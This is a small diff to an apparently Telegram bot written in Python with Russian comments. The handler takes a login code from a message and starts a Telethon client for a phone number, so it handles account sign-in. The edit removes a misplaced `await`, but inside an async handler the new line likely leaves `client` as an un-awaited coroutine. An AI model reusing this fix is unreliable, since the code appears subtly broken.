@@ -90,7 +90,7 @@ async def get_code(message: types.Message):
     try:
         #await client.sign_in(phone_number, code, phone_code_hash=phone_code_hash)
         #await message.reply("Успешная авторизация!")
-        await client = TelegramClient(phone, api_id, api_hash).start(phone)
+        client = TelegramClient(phone, api_id, api_hash).start(phone)
 
         # После успешной авторизации выполнение функций
         selection = '0'
